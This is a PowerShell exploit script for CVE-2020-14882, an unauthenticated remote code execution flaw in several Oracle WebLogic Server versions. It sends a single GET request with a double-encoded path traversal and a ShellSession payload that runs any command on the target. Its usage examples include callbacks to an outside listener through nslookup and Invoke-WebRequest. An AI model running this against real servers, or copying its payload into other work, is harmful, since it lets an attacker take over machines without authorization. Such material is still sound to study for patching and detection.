# Exploit Title: Oracle WebLogic Server 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 - Unauthenticated RCE via GET request
# CVE: CVE-2020-14882
# Vendor Homepage: https://www.oracle.com/middleware/technologies/weblogic.html
# Software Link: https://www.oracle.com/technetwork/middleware/downloads/index.html
# More Info: https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf

param (
    [string]$target,
    [string]$command
)

if (!$target -or !$command) {
    Write-Host "[+] WebLogic Unauthenticated RCE via GET request"
    Write-Host "[+] Usage : .\exploit.ps1 -target 'http(s)://target:7001' -command 'command'"
    Write-Host "[+] Example1 : .\exploit.ps1 -target 'http(s)://target:7001' -command 'nslookup your_Domain'"
    Write-Host "[+] Example2 : .\exploit.ps1 -target 'http(s)://target:7001' -command 'powershell.exe -c Invoke-WebRequest -Uri http://your_listener'"
    exit
}

$headers = @{
    'Content-type' = 'application/x-www-form-urlencoded; charset=utf-8'
}

Write-Host "[+] Sending GET Request ...."

$GET_Request = Invoke-WebRequest -Uri "$target/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(`"java.lang.Runtime.getRuntime().exec('$command');`");" -Headers $headers -UseBasicParsing

Write-Host "[+] Done !!"
